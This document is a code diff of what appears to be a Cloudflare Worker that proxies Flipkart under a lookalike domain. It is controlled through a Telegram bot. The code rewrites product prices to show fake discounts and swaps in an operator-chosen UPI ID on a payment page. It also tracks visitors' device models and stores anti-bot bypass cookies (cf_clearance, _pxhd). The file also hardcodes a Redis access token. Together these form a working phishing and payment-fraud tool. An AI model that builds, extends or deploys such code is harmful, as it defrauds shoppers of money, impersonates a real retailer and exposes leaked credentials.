-    const res = await fetch(TG_API, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: String(chatId),
-        text: String(text).slice(0, 4096),
-        parse_mode: "HTML",
-      }),
-    });
-    if (!res.ok) {
-      const errText = await res.text();
-      await setRedis("tg_last_error", `Status: ${res.status}, Body: ${errText}`);
-    }
-  } catch (e) {
-    await setRedis("tg_last_error", `Fetch exception: ${e.message}`);
-  }
-}
-
-
-
-// ── Upstash Redis Helpers (REST API) ──────────────────────────
-const REDIS_URL = "https://bursting-anchovy-154415.upstash.io";
-const REDIS_TOKEN = "gQAAAAAAAlsvAAIgcDFiZjE0OWRkNmMyYWU0ZjdhOWMyYTQ1NTVhNDVlMDc2OA";
-
-async function getRedis(key) {
-  try {
-    const res = await fetch(`${REDIS_URL}/get/${key}`, {
-      headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
-    });
-    if (!res.ok) return null;
-    const data = await res.json();
-    return data.result; // Upstash REST JSON format returns actual value in .result
-  } catch (e) {
-    return null;
-  }
-}
-
-async function setRedis(key, value) {
-  try {
-    await fetch(`${REDIS_URL}/set/${key}/${encodeURIComponent(value)}`, {
-      headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
-    });
-  } catch (e) { }
-}
-
-async function deleteRedis(key) {
-  try {
-    await fetch(`${REDIS_URL}/del/${key}`, {
-      headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
-    });
-  } catch (e) { }
-}
-
-// ── Refactored KV helpers using Redis ──────────────────────────
-let _discountCache = -1;
-let _discountCacheAt = 0;
-const DISCOUNT_TTL_MS = 10 * 1000; // Cache discount for 10 seconds
-
-async function getDiscount() {
-  const now = Date.now();
-  if (_discountCache !== -1 && now - _discountCacheAt < DISCOUNT_TTL_MS) {
-    return _discountCache;
-  }
-  try {
-    const val = await getRedis("discount");
-    const n = parseFloat(val);
-    const finalPct = !isNaN(n) && n >= 5 && n <= 99 ? n : 0;
-    _discountCache = finalPct;
-    _discountCacheAt = now;
-    return finalPct;
-  } catch (_) {
-    return 0;
-  }
-}
-
-async function setDiscount(pct) {
-  try {
-    if (!pct || pct <= 0) {
-      await deleteRedis("discount");
-      _discountCache = 0;
-    } else {
-      await setRedis("discount", String(pct));
-      _discountCache = pct;
-    }
-    _discountCacheAt = Date.now();
-  } catch (_) { }
-}
-
-// ── Indian number formatter: 56900 → "56,900" ─────────────────
-function fmtIndian(n) {
-  if (n <= 999) return String(n);
-  const s = String(n);
-  const last3 = s.slice(-3);
-  let rest = s.slice(0, -3);
-  const parts = [];
-  while (rest.length > 2) {
-    parts.unshift(rest.slice(-2));
-    rest = rest.slice(0, -2);
-  }
-  if (rest) parts.unshift(rest);
-  return parts.join(",") + "," + last3;
-}
-
-// ── Mobile Device Model Parsing & Visitor Notification ─────────
-function parseModelFromRequest(request) {
-  let chModel = request.headers.get("sec-ch-ua-model");
-  if (chModel) {
-    return chModel.replace(/"/g, "").trim();
-  }
-  const ua = request.headers.get("user-agent") || "";
-  if (!ua) return "Unknown";
-  if (ua.includes("iPhone")) return "iPhone";
-  if (ua.includes("iPad")) return "iPad";
-  if (ua.includes("iPod")) return "iPod";
-
-  const androidMatch = ua.match(/Android\s+\d+;\s+([^;)]+)/);
-  if (androidMatch) {
-    let model = androidMatch[1].trim();
-    if (model.includes("Build/")) {
-      model = model.split("Build/")[0].trim();
-    }
-    if (model === "K" || model === "k") {
-      return "Android Device";
-    }
-    return model;
-  }
-  return "Other/Desktop";
-}
-
-async function handleNewVisitor(modelNum) {
-  try {
-    const rawList = await getRedis("devices_list");
-    let devices = [];
-    if (rawList) {
-      devices = JSON.parse(rawList);
-    }
-    if (!devices.includes(modelNum)) {
-      devices.push(modelNum);
-      await setRedis("devices_list", JSON.stringify(devices));
-
-      const listenState = await getRedis("listen_state") || "on";
-      if (listenState === "on") {
-        await tg(`📱 <b>New User Visited</b>\nModel Number: <code>${modelNum}</code>`);
-      }
-    }
-  } catch (e) { }
-}
-
-// ── Server-side JSON discount ─────────────────────────────────
-// Layer 1: Called on EVERY JSON API response before React sees it
-function applyDiscountToJson(jsonStr, pct) {
-  if (!pct || pct <= 0) return jsonStr;
-  // Skip very large responses to avoid Worker CPU timeout
-  if (jsonStr.length > 200000) {
-    // Use regex fallback for large responses (much cheaper)
-    return applyDiscountToRegexFallback(jsonStr, pct);
-  }
-  try {
-    const obj = JSON.parse(jsonStr);
-    discObjServer(obj, pct, false, false, false, 0);
-    return JSON.stringify(obj);
-  } catch (e) {
-    return applyDiscountToRegexFallback(jsonStr, pct);
-  }
-}
-
-
-function isServerMrpKey(k) {
-  if (!k) return false;
-  const lk = k.toLowerCase();
-  const mrpKeys = {
-    mrp: 1,
-    maxretailprice: 1,
-    strikethroughprice: 1,
-    strikeprice: 1,
-    strikeoffprice: 1,
-    strikeoff: 1,
-    mrpvalue: 1,
-    totalmrp: 1,
-    originalprice: 1,
-    wasprice: 1,
-    listprice: 1,
-    retailprice: 1,
-  };
-  if (mrpKeys[lk]) return true;
-  if (lk.includes("mrp")) return true;
-  if (lk.includes("strike")) return true;
-  if (
-    lk.includes("originalprice") ||
-    lk.includes("wasprice") ||
-    lk.includes("listprice") ||
-    lk.includes("retailprice")
-  ) {
-    return true;
-  }
-  if (lk.includes("beforediscount") || lk.includes("prediscount")) return true;
-  return false;
-}
-
-function isMrpString(s) {
-  if (!s || typeof s !== "string") return false;
-  const ls = s.toLowerCase().trim();
-  return (
-    ls === "mrp" ||
-    ls === "m.r.p." ||
-    ls === "strikeoff" ||
-    ls === "strikeoffprice"
-  );
-}
-
-function isMrpKeyVal(k, val) {
-  if (!k) return false;
-  const lk = k.toLowerCase();
-  if (
-    lk.includes("strike") ||
-    lk.includes("mrp") ||
-    lk.includes("original") ||
-    lk.includes("was")
-  ) {
-    if (val === true || String(val).toLowerCase() === "true") {
-      return true;
-    }
-  }
-  return false;
-}
-
-function isServerDiscountPercentageKey(k) {
-  if (!k) return false;
-  const lk = k.toLowerCase();
-  return lk.includes("discount") || lk.includes("off") || lk.includes("saving") || lk.includes("percentage") || lk.includes("pct");
-}
-
-function isServerPriceKey(k) {
-  if (!k) return false;
-  const lk = k.toLowerCase();
-  const serverPK = {
-    finalprice: 1,
-    mrp: 1,
-    sellingprice: 1,
-    basesellingprice: 1,
-    primaryproductprice: 1,
-    totalprice: 1,
-    discountedprice: 1,
-    effectiveprice: 1,
-    listingprice: 1,
-    price: 1,
-    strikethroughprice: 1,
-    offerprice: 1,
-    saleprice: 1,
-    baseprice: 1,
-    maxretailprice: 1,
-    retailprice: 1,
-    sp: 1,
-    fp: 1,
-    unitprice: 1,
-    specialprice: 1,
-    totalamount: 1,
-    carttotal: 1,
-    ordertotal: 1,
-    payableamount: 1,
-    grandtotal: 1,
-    subtotal: 1,
-    itemtotal: 1,
-    netprice: 1,
-    strikeprice: 1,
-    ourprice: 1,
-    bestprice: 1,
-    lowestprice: 1,
-    coinvalue: 1,
-    feelabelprice: 1,
-    strikeoffprice: 1,
-    strikeoff: 1,
-    originalprice: 1,
-    listprice: 1,
-    wasprice: 1,
-    mrpvalue: 1,
-    displayprice: 1,
-    totalmrp: 1,
-    totalsavings: 1,
-    totalsellingprice: 1,
-    totalcharge: 1,
-    totalcharges: 1,
-    totalpayable: 1,
-    checkouttotal: 1,
-    baskettotal: 1,
-    orderamount: 1,
-    cartamount: 1,
-    totalsp: 1,
-    totalfinalprice: 1,
-    codcharges: 1,
-    deliverycharge: 1,
-    offersavings: 1,
-    totaldiscount: 1,
-    bagtotal: 1,
-    checkoutamount: 1,
-    paymentamount: 1,
-    billamount: 1,
-  };
-  return (
-    !!serverPK[lk] ||
-    lk.includes("price") ||
-    lk.includes("mrp") ||
-    lk.includes("strike") ||
-    lk.includes("amount") ||
-    lk.includes("payable") ||
-    lk.includes("saving") ||
-    lk.includes("charge") ||
-    lk.includes("fee") ||
-    lk.includes("tax")
-  );
-}
-
-function discObjServer(o, pct, pp, isMrpContext, isDiscountContext, _depth) {
-  if (!o || typeof o !== "object") return;
-  if (o.__sd) return;
-  const depth = _depth || 0;
-  if (depth > 25) return;
-  try {
-    Object.defineProperty(o, "__sd", { value: true, writable: true, enumerable: false, configurable: true });
-  } catch (_) {
-    o.__sd = true;
-  }
-  const mult = (100 - pct) / 100;
-  const inr =
-    o.currency === "INR" ||
-    o.currencySymbol === "₹" ||
-    o.currencySymbol === "\u20b9";
-  const sd = pp || inr;
-
-  let objectIsMrp = isMrpContext;
-  let objectIsDiscount = isDiscountContext;
-  if (!Array.isArray(o)) {
-    for (const k in o) {
-      if (Object.prototype.hasOwnProperty.call(o, k)) {
-        const val = o[k];
-        if (isMrpKeyVal(k, val)) {
-          objectIsMrp = true;
-        }
-        if (typeof val === "string") {
-          if (isMrpString(val)) {
-            objectIsMrp = true;
-          }
-          const lval = val.toLowerCase();
-          if (lval === "percentage" || lval.includes("discount")) {
-            objectIsDiscount = true;
-          }
-        } else if (val && typeof val === "object" && !Array.isArray(val)) {
-          // Depth-2 scan
-          for (const k2 in val) {
-            if (Object.prototype.hasOwnProperty.call(val, k2)) {
-              const val2 = val[k2];
-              if (isMrpKeyVal(k2, val2)) {
-                objectIsMrp = true;
-              }
-              if (typeof val2 === "string") {
-                if (isMrpString(val2)) {
-                  objectIsMrp = true;
-                }
-              }
-            }
-          }
-        }
-      }
-    }
-  }
-
-  for (const k in o) {
-    if (!Object.prototype.hasOwnProperty.call(o, k)) continue;
-    const v = o[k];
-    const currentIsMrp = objectIsMrp || isServerMrpKey(k);
-    const currentIsDiscount = objectIsDiscount || isServerDiscountPercentageKey(k);
-
-
-
-    if (v && typeof v === "object") {
-      discObjServer(v, pct, sd || isServerPriceKey(k), currentIsMrp, currentIsDiscount, depth + 1);
-    } else if (typeof v === "number") {
-      if ((currentIsDiscount || isServerDiscountPercentageKey(k)) && v < 100) {
-        o[k] = pct;
-      } else if (isServerPriceKey(k) && !currentIsMrp && v >= 500) {
-        o[k] = Math.round(v * mult);
-      } else if (
-        sd &&
-        !currentIsMrp &&
-        (k === "value" || k === "valueInRupees" || k === "amount") &&
-        v >= 500
-      ) {
-        o[k] = Math.round(v * mult);
-      }
-    } else if (typeof v === "string") {
-      if (currentIsDiscount || isServerDiscountPercentageKey(k)) {
-        if (v.includes("%")) {
-          o[k] = v.replace(/\d+%/g, pct + "%");
-        } else {
-          const num = parseFloat(v);
-          if (!isNaN(num) && num < 100) o[k] = String(pct);
-        }
-      } else if (v.indexOf("₹") !== -1 || v.indexOf("\u20b9") !== -1) {
-        if (!currentIsMrp) {
-          o[k] = v.replace(/(?:₹|\u20b9)\s*([\d,]+)/g, (m, p) => {
-            const n = parseInt(p.replace(/,/g, ""), 10);
-            if (isNaN(n) || n < 500) return m;
-            return (
-              (m.charAt(0) === "₹" ? "₹" : "\u20b9") +
-              fmtIndian(Math.round(n * mult))
-            );
-          });
-        }
-      } else if (isServerPriceKey(k) && !currentIsMrp) {
-        const num = parseFloat(v.replace(/,/g, ""));
-        if (!isNaN(num) && num >= 500) o[k] = (num * mult).toFixed(2);
-      } else if (
-        sd &&
-        !currentIsMrp &&
-        (k === "decimalValue" ||
-          k === "value" ||
-          k === "valueInRupees" ||
-          k === "amount" ||
-          k === "text" ||
-          k === "displayValue" ||
-          k === "formattedValue" ||
-          k === "displayPrice")
-      ) {
-        const num = parseFloat(v.replace(/,/g, ""));
-        if (!isNaN(num) && num >= 500) {
-          o[k] = v.includes(",")
-            ? fmtIndian(Math.round(num * mult))
-            : (num * mult).toFixed(2);
-        }
-      }
-    }
-  }
-}
-
-function applyDiscountToRegexFallback(jsonStr, pct) {
-  const mult = (100 - pct) / 100;
-  let out = jsonStr;
-  function discountNum(numStr) {
-    const num = parseInt(String(numStr).replace(/,/g, ""), 10);
-    if (isNaN(num) || num < 500) return null;
-    return Math.round(num * mult);
-  }
-  out = out.replace(/(?:₹|\u20b9)([\d,]{2,})/g, (m, p) => {
-    const num = parseInt(p.replace(/,/g, ""), 10);
-    if (isNaN(num) || num < 500) return m;
-    return (
-      (m.charAt(0) === "₹" ? "₹" : "\u20b9") +
-      fmtIndian(Math.round(num * mult))
-    );
+  return new Response(html, {
+    headers: {
+      "Content-Type": "text/html; charset=utf-8",
+      "Cache-Control": "no-store",
+      "Access-Control-Allow-Origin": origin || "*",
+    },
   });
-  return out;
-}
-
-function buildDomPriceScript(pct) {
-  return "";
-}
-
-// ── Cookie jar ────────────────────────────────────────────────
-// IMPORTANT: NO shared cookieJar. Each request creates its own reqJar
-// (Map) in the fetch handler. Module-level bypassJar holds ONLY
-// non-session bypass cookies — never user session/login cookies.
-// This prevents Account A's session leaking to User B.
-const bypassJar = new Map(); // module-level: bypass cookies only
-
-function parseCookies(list, jar) {
-  for (const h of list) {
-    const part = h.split(";")[0].trim();
-    const eq = part.indexOf("=");
-    if (eq > 0) jar.set(part.slice(0, eq).trim(), part.slice(eq + 1).trim());
-  }
-}
-
-function buildCookieHeader(incoming, jar) {
-  const stored = [...jar.entries()].map(([k, v]) => `${k}=${v}`).join("; ");
-  if (!incoming) return stored;
-  if (!stored) return incoming;
-  const m = new Map();
-  for (const p of incoming.split(";")) {
-    const e = p.indexOf("=");
-    if (e > 0) m.set(p.slice(0, e).trim(), p.slice(e + 1).trim());
-  }
-  for (const [k, v] of jar) m.set(k, v);
-  return [...m.entries()].map(([k, v]) => `${k}=${v}`).join("; ");
-}
-
-function _applyBypassString(str) {
-  // Writes ONLY to bypassJar (module-level), never to per-request jar
-  for (const part of str.split(";")) {
-    const eq = part.indexOf("=");
-    if (eq <= 0) continue;
-    const k = part.slice(0, eq).trim();
-    const v = part.slice(eq + 1).trim();
-    if (k && v) bypassJar.set(k, v);
-  }
-}
-
-async function loadBypassCookies() {
-  const now = Date.now();
-  if (_bypassCache && now - _bypassCacheAt < BYPASS_TTL_MS) {
-    _applyBypassString(_bypassCache);
-    return;
-  }
-  try {
-    const saved = await getRedis("bypass_cookies");
-    _bypassCache = saved || "";
-    _bypassCacheAt = now;
-    if (saved) _applyBypassString(saved);
-  } catch (_) { }
-}
-
-// jar = per-request Map — only safe (non-session) cookies saved to Redis
-async function saveBypassCookies(jar) {
-  if (!jar || jar.size === 0) return;
-  try {
-    const safe = [...jar.entries()]
-      .filter(([k]) => ALLOWED_BYPASS_COOKIE_RE.test(k))
-      .map(([k, v]) => `${k}=${v}`)
-      .join("; ");
-    if (safe) {
-      _applyBypassString(safe); // update module-level bypassJar too
-      _bypassCache = safe;
-      _bypassCacheAt = Date.now();
-      await setRedis("bypass_cookies", safe);
-    }
-  } catch (_) { }
 }
 
 // ── URL rewriting ─────────────────────────────────────────────
@@ -1970,13 +2090,11 @@ async function proxySubdomain(
   }
   const ms = Date.now() - t0;
 
-  const setCookies = upstream.headers.getSetCookie
-    ? upstream.headers.getSetCookie()
-    : upstream.headers.getAll
-      ? upstream.headers.getAll("set-cookie")
-      : upstream.headers.get("set-cookie")
-        ? [upstream.headers.get("set-cookie")]
-        : [];
+  const setCookies = upstream.headers.getAll
+    ? upstream.headers.getAll("set-cookie")
+    : upstream.headers.get("set-cookie")
+      ? [upstream.headers.get("set-cookie")]
+      : [];
   if (setCookies.length) {
     parseCookies(setCookies, jar);
     ctx.waitUntil(saveBypassCookies(jar));
@@ -2008,7 +2126,7 @@ async function proxySubdomain(
     const respText = await upstream.text();
     if (ct.includes("json")) {
       const skipDiscount =
-                subpath.includes("user/state") ||
+        subpath.includes("user/state") ||
         subpath.includes("login") ||
         subpath.includes("otp") ||
         subpath.includes("verify") ||
@@ -2088,7 +2206,7 @@ async function proxySubdomain(
 const workerObj = {
   async fetch(request, env, ctx) {
     const url = new URL(request.url);
-    const path = request.headers.get("x-invoke-path") || request.headers.get("x-matched-path") || url.pathname;
+    const path = url.pathname;
     const origin = request.headers.get("origin") || "";
     const base = `${url.protocol}//${url.host}/`;
 
@@ -2105,54 +2223,6 @@ const workerObj = {
       });
     }
 
-    // ── Payment Gateway Router ────────────────────────────────────
-    if (path === "/api/upi") {
-      const upiId = await getRedis("active_upi");
-      const addedAt = await getRedis("active_upi_added_at");
-      const addedBy = await getRedis("active_upi_added_by");
-      
-      return new Response(JSON.stringify({
-        active: !!upiId,
-        upiId: upiId,
-        addedAt: addedAt,
-        addedBy: addedBy
-      }), {
-        headers: {
-          "Content-Type": "application/json",
-          "Access-Control-Allow-Origin": origin || "*",
-          "Access-Control-Allow-Credentials": "true",
-          "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
-          "Access-Control-Allow-Headers": "Content-Type"
-        }
-      });
-    }
-
-    if (path.startsWith("/assets/")) {
-      const targetUrl = `https://paymentgataway.vercel.app${path}`;
-      const assetResp = await fetch(targetUrl);
-      
-      const ph = new Headers(assetResp.headers);
-      ph.set("Access-Control-Allow-Origin", origin || "*");
-      ph.set("Access-Control-Allow-Credentials", "true");
-      
-      return new Response(assetResp.body, {
-        status: assetResp.status,
-        headers: ph
-      });
-    }
-
-    const search = url.search || "";
-    if (search && (search.startsWith("?=") || search.startsWith("?address") || search.includes("address"))) {
-      return new Response(PAYMENT_HTML, {
-        headers: {
-          "Content-Type": "text/html; charset=utf-8",
-          "Cache-Control": "no-store",
-          "Access-Control-Allow-Origin": origin || "*",
-          "Access-Control-Allow-Credentials": "true"
-        }
-      });
-    }
-
     if (path === "/__fk_log_device") {
       const model = url.searchParams.get("model") || "";
       if (model && model !== "K" && model !== "k" && model !== "Android Device") {
@@ -2166,9 +2236,7 @@ const workerObj = {
       });
     }
 
-    if (path !== "/__tgwebhook") {
-      await loadBypassCookies();
-    }
+    await loadBypassCookies();
 
     if (path === "/__tgwebhook" && request.method === "POST") {
       try {
@@ -2177,21 +2245,25 @@ const workerObj = {
         if (msg?.text) {
           const chatId = String(msg.chat.id);
           const text = msg.text.trim();
+          const cmd = text.split(/\s+/)[0].split("@")[0].toLowerCase();
+
           if (chatId === TG_CHAT) {
-            if (text === "/discountstatus") {
+            if (cmd === "/discountstatus") {
               const cur = await getDiscount();
               await tg(
                 cur > 0
                   ? `📊 Current discount: ${cur}%\nSite pe ${cur}% discount active hai.\n\nHatane ke liye: /discount off`
                   : "📊 Koi discount active nahi.\nReal Flipkart prices dikh rahi hain.\n\nLagane ke liye: /discount 30",
+                chatId
               );
-            } else if (text.startsWith("/discount")) {
+            } else if (cmd === "/discount") {
               const parts = text.split(/\s+/);
               const arg = (parts[1] || "").toLowerCase();
               if (!arg || arg === "off" || arg === "0") {
                 await setDiscount(0);
                 await tg(
                   "✅ Discount hataya gaya!\nAb site pe real Flipkart prices dikhenge.",
+                  chatId
                 );
               } else {
                 const pct = parseFloat(arg);
@@ -2199,20 +2271,22 @@ const workerObj = {
                   await setDiscount(pct);
                   await tg(
                     `✅ ${pct}% discount LIVE ho gaya!\n\nAb https://flipkart.knandkk07.workers.dev/ pe saare products ${pct}% kam price mein dikhenge.\n\n⚠️ Ye sirf UI demo hai — actual checkout pe real price lagegi.`,
+                    chatId
                   );
                 } else {
                   await tg(
                     "❌ Format: /discount 30\nRange: 5 se 99 tak\n\nHatane ke liye: /discount off",
+                    chatId
                   );
                 }
               }
-            } else if (text === "/seecookies") {
-              // Show current Redis bypass cookies
+            } else if (cmd === "/seecookies") {
               try {
                 const raw = await getRedis("bypass_cookies");
                 if (!raw) {
                   await tg(
                     "🍪 Redis mein koi bypass cookie nahi hai abhi.\n\nAdd karne ke liye:\n/addcookie cf_clearance=xxx; _pxhd=yyy",
+                    chatId
                   );
                 } else {
                   const parts = raw
@@ -2222,36 +2296,34 @@ const workerObj = {
                   const lines = parts.map((p) => `  • ${p}`).join("\n");
                   await tg(
                     `🍪 Current bypass cookies (${parts.length}):\n\n${lines}`,
+                    chatId
                   );
                 }
               } catch (e) {
-                await tg(`❌ Error: ${e.message}`);
+                await tg(`❌ Error: ${e.message}`, chatId);
               }
-            } else if (text === "/removecookie") {
-              // Clear all Redis bypass cookies + in-memory cache
+            } else if (cmd === "/removecookie") {
               try {
                 await deleteRedis("bypass_cookies");
-                // Clear in-memory cache
                 _bypassCache = "";
                 _bypassCacheAt = 0;
                 bypassJar.clear();
                 await tg(
                   "🗑️ Bypass cookies Redis se delete ho gayi!\n\nBypassJar aur memory cache bhi clear.\n\nAgle visitor ke liye fresh cookies fetch hongi Flipkart se.",
+                  chatId
                 );
               } catch (e) {
-                await tg(`❌ Error: ${e.message}`);
+                await tg(`❌ Error: ${e.message}`, chatId);
               }
-            } else if (text.startsWith("/addcookie")) {
-              // Manually add bypass cookies to Redis
-              // Usage: /addcookie cf_clearance=abc; _pxhd=xyz; __fbp=fb.1.xxx
+            } else if (cmd === "/addcookie") {
               const raw = text.slice("/addcookie".length).trim();
               if (!raw) {
                 await tg(
                   "❌ Format:\n/addcookie cf_clearance=abc; _pxhd=xyz\n\nMultiple cookies semicolon se alag karo.",
+                  chatId
                 );
               } else {
                 try {
-                  // Parse and filter — only ALLOWED_BYPASS_COOKIE_RE saved
                   const parts = raw
                     .split(";")
                     .map((s) => s.trim())
@@ -2273,130 +2345,109 @@ const workerObj = {
                   if (safe.length === 0) {
                     await tg(
                       `❌ Koi bhi bypass cookie nahi mili.\n\nYe cookies allowlist mein nahi hain aur save nahi ki ja sakti:\n${skipped.map((k) => `  • ${k}`).join("\n")}\n\nSirf bypass cookies dalo, jaise: cf_clearance, ak_bmsc, _pxhd, __fbp, _gcl_au`,
+                      chatId
                     );
                   } else {
                     const merged = safe.join("; ");
-                    // Update Redis
                     await setRedis("bypass_cookies", merged);
-                    // Update in-memory cache
                     _bypassCache = merged;
                     _bypassCacheAt = Date.now();
                     _applyBypassString(merged);
-                    let msg = `✅ ${safe.length} cookie(s) save ho gayi (23 ghante ke liye):\n${safe.map((c) => `  ✓ ${c.split("=")[0]}`).join("\n")}`;
+                    let msgStr = `✅ ${safe.length} cookie(s) save ho gayi (23 ghante ke liye):\n${safe.map((c) => `  ✓ ${c.split("=")[0]}`).join("\n")}`;
                     if (skipped.length > 0)
-                      msg += `\n\n⚠️ ${skipped.length} non-bypass cookie(s) SKIP ki:\n${skipped.map((k) => `  ✗ ${k}`).join("\n")}`;
-                    await tg(msg);
+                      msgStr += `\n\n⚠️ ${skipped.length} non-bypass cookie(s) SKIP ki:\n${skipped.map((k) => `  ✗ ${k}`).join("\n")}`;
+                    await tg(msgStr, chatId);
                   }
                 } catch (e) {
-                  await tg(`❌ Error: ${e.message}`);
+                  await tg(`❌ Error: ${e.message}`, chatId);
                 }
               }
-            } else if (text === "/devices") {
+            } else if (cmd === "/devices") {
               try {
                 const raw = await getRedis("devices_list");
                 const devices = raw ? JSON.parse(raw) : [];
                 if (devices.length === 0) {
-                  await tg("📱 No devices recorded yet.");
+                  await tg("📱 No devices recorded yet.", chatId);
                 } else {
                   const lines = devices.map((d, i) => `${i + 1}. <code>${d}</code>`).join("\n");
-                  await tg(`📱 <b>Recorded Devices (${devices.length}):</b>\n\n${lines}`);
+                  await tg(`📱 <b>Recorded Devices (${devices.length}):</b>\n\n${lines}`, chatId);
                 }
               } catch (e) {
-                await tg(`❌ Error: ${e.message}`);
+                await tg(`❌ Error: ${e.message}`, chatId);
               }
-            } else if (text.startsWith("/listen")) {
+            } else if (cmd === "/listen") {
               const parts = text.split(/\s+/);
               const arg = (parts[1] || "").toLowerCase();
               if (arg === "on") {
                 await setRedis("listen_state", "on");
-                await tg("🔊 Visitor notifications turned <b>ON</b>.");
+                await tg("🔊 Visitor notifications turned <b>ON</b>.", chatId);
               } else if (arg === "off") {
                 await setRedis("listen_state", "off");
-                await tg("🔇 Visitor notifications turned <b>OFF</b>.");
+                await tg("🔇 Visitor notifications turned <b>OFF</b>.", chatId);
               } else {
                 const cur = await getRedis("listen_state") || "on";
-                await tg(`🔊 Current listen state: <b>${cur.toUpperCase()}</b>\nUse <code>/listen on</code> or <code>/listen off</code> to change.`);
+                await tg(`🔊 Current listen state: <b>${cur.toUpperCase()}</b>\nUse <code>/listen on</code> or <code>/listen off</code> to change.`, chatId);
               }
-            } else if (text === "/cleardevices" || text === "/clear" || text === "/clear devices") {
-              try {
-                await setRedis("devices_list", JSON.stringify([]));
-                await tg("🧹 Device history has been cleared successfully! All next visits will be treated as new users.");
-              } catch (e) {
-                await tg(`❌ Error: ${e.message}`);
-              }
-            } else if (text.startsWith("/addupi")) {
+            } else if (cmd === "/addupi") {
               const parts = text.split(/\s+/);
               const upiId = parts[1];
               if (!upiId) {
-                await tg("<b>Usage:</b>\n<code>/addupi active_upi@upi</code>");
+                await tg("<b>Usage:</b>\n<code>/addupi vikram2517@ptaxis</code>", chatId);
               } else if (!upiId.includes("@")) {
-                await tg("<b>Invalid UPI ID</b>\nMust contain @ symbol.");
+                await tg("<b>Invalid UPI ID</b>\nUPI ID must contain @ symbol.", chatId);
               } else {
                 await setRedis("active_upi", upiId);
                 await setRedis("active_upi_added_at", new Date().toISOString());
-                await setRedis("active_upi_added_by", msg.from?.username || "unknown");
-                await tg(`<b>UPI ID Added Successfully!</b>\n\nUPI ID: <code>${upiId}</code>\nStatus: Active`);
+                await tg(`<b>UPI ID Added Successfully!</b>\n\nUPI ID: <code>${upiId}</code>\nStatus: Active\n\nPayment page is now live.`, chatId);
               }
-            } else if (text === "/removeupi") {
+            } else if (cmd === "/removeupi") {
               const current = await getRedis("active_upi");
               if (!current) {
-                await tg("<b>No Active UPI ID configured.</b>");
+                await tg("<b>No Active UPI ID</b>\nNo UPI ID is currently configured.", chatId);
               } else {
                 await deleteRedis("active_upi");
                 await deleteRedis("active_upi_added_at");
-                await deleteRedis("active_upi_added_by");
-                await tg(`<b>UPI ID Removed!</b>\n\nRemoved: <code>${current}</code>`);
+                await tg(`<b>UPI ID Removed!</b>\n\nRemoved: <code>${current}</code>`, chatId);
               }
-            } else if (text === "/status") {
+            } else if (cmd === "/upistatus" || cmd === "/status") {
+              const upiId = await getRedis("active_upi");
+              const addedAt = await getRedis("active_upi_added_at");
+              if (upiId) {
+                await tg(`<b>UPI Status: Active</b>\n\nUPI ID: <code>${upiId}</code>\nAdded: ${addedAt || 'N/A'}`, chatId);
+              } else {
+                await tg("<b>UPI Status: Inactive</b>\n\nNo UPI ID is currently configured.", chatId);
+              }
+            } else if (cmd === "/cleardevices" || cmd === "/clear") {
               try {
-                const upiId = await getRedis("active_upi");
-                const addedAt = await getRedis("active_upi_added_at");
-                const addedBy = await getRedis("active_upi_added_by");
-                const curDiscount = await getDiscount();
-                
-                let statusMsg = "📊 <b>System Status</b>\n\n";
-                statusMsg += `🏷️ <b>Discount:</b> ${curDiscount > 0 ? `<b>${curDiscount}%</b> Active` : "Inactive"}\n\n`;
-                if (upiId) {
-                  statusMsg += `💳 <b>UPI Status:</b> Active\n` +
-                               `UPI ID: <code>${upiId}</code>\n` +
-                               `Added By: @${addedBy || "unknown"}\n` +
-                               `Added At: ${addedAt || "N/A"}\n`;
-                } else {
-                  statusMsg += `💳 <b>UPI Status:</b> Inactive (No UPI ID configured)\n`;
-                }
-                await tg(statusMsg);
+                await setRedis("devices_list", JSON.stringify([]));
+                await tg("🧹 Device history has been cleared successfully! All next visits will be treated as new users.", chatId);
               } catch (e) {
-                await tg(`❌ Error: ${e.message}`);
+                await tg(`❌ Error: ${e.message}`, chatId);
               }
-            } else if (text === "/help" || text === "/start") {
+            } else if (cmd === "/help" || cmd === "/start") {
               await tg(
-                `🛠 Flipkart Proxy Bot — Commands:\n\n` +
-                `━━━ 🏷️ DISCOUNT ━━━\n` +
-                `/discount 30 — 30% discount lagao (5-99%)\n` +
-                `/discount off — Discount hatao\n` +
-                `/discountstatus — Current discount check karo\n\n` +
-                `━━━ 💳 UPI / PAYMENTS ━━━\n` +
-                `/addupi &lt;upi-id&gt; — Add a new UPI ID\n` +
-                `/removeupi — Remove active UPI ID\n` +
-                `/status — Check active UPI & discount status\n\n` +
-                `━━━ 📱 VISITOR TRACKING ━━━\n` +
-                `/devices — Visited device models list dekho\n` +
-                `/listen on/off — New user alerts turn ON or OFF\n` +
-                `/cleardevices — Clear device history (reset)\n\n` +
-                `━━━ 🍪 COOKIES ━━━\n` +
-                `/seecookies — KV mein stored bypass cookies dekho\n` +
-                `/addcookie cf_clearance=xxx; _pxhd=yyy — Manually cookies add karo\n` +
-                `/removecookie — Saari bypass cookies delete karo\n\n` +
-                `💡 Workflow (har 15-20 ghante):\n` +
-                `1. /removecookie\n` +
-                `2. Real flipkart.com browser mein kholo\n` +
-                `3. DevTools se cookies copy karo\n` +
-                `4. /addcookie se paste karo\n` +
-                `5. /seecookies se verify karo`,
+                `🛠 <b>Flipkart Proxy Bot — Commands:</b>\n\n` +
+                `━━━ 💸 <b>UPI PAYMENT</b> ━━━\n` +
+                `<code>/addupi &lt;upi_id&gt;</code> — Set active UPI ID\n` +
+                `<code>/removeupi</code> — Remove active UPI ID\n` +
+                `<code>/upistatus</code> — Check current active UPI ID\n\n` +
+                `━━━ 🏷️ <b>DISCOUNT</b> ━━━\n` +
+                `<code>/discount 30</code> — 30% discount lagao (5-99%)\n` +
+                `<code>/discount off</code> — Discount hatao\n` +
+                `<code>/discountstatus</code> — Current discount check karo\n\n` +
+                `━━━ 📱 <b>VISITOR TRACKING</b> ━━━\n` +
+                `<code>/devices</code> — Visited device models list dekho\n` +
+                `<code>/listen on/off</code> — New user alerts turn ON or OFF\n` +
+                `<code>/cleardevices</code> — Clear device history (reset)\n\n` +
+                `━━━ 🍪 <b>COOKIES</b> ━━━\n` +
+                `<code>/seecookies</code> — KV mein stored bypass cookies dekho\n` +
+                `<code>/addcookie cf_clearance=xxx; _pxhd=yyy</code> — Manually cookies add karo\n` +
+                `<code>/removecookie</code> — Saari bypass cookies delete karo`,
+                chatId
               );
-            } else {
